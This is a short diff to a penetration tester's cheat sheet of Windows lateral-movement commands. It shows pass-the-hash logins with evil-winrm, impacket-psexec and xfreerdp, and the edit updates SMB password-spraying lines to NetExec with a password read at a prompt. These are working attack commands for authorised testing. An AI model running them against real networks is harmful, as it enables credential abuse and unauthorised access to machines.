@@ -17,11 +17,13 @@ evil-winrm -i $TARGET -u $USER -H HASH
 # PSExec (noisy — creates service)
 impacket-psexec $DOMAIN/$USER@$TARGET -hashes :HASH
 
-# CrackMapExec spray
-netexec smb $SUBNET/24 -u $USER -H HASH --local-auth
+# NetExec spray
+nxc smb "$SUBNET" -u "$USER" -H "$NTLM_HASH" --local-auth
 
 # Spray credentials
-netexec smb $SUBNET/24 -u users.txt -p 'Password123!'
+read -rsp 'Approved spray candidate: ' SPRAY_PASS; printf '\n'
+nxc smb "$SUBNET" -u users.txt -p "$SPRAY_PASS" --no-bruteforce
+unset SPRAY_PASS
 
 # RDP
 xfreerdp /v:$TARGET /u:$USER /pth:HASH /d:$DOMAIN
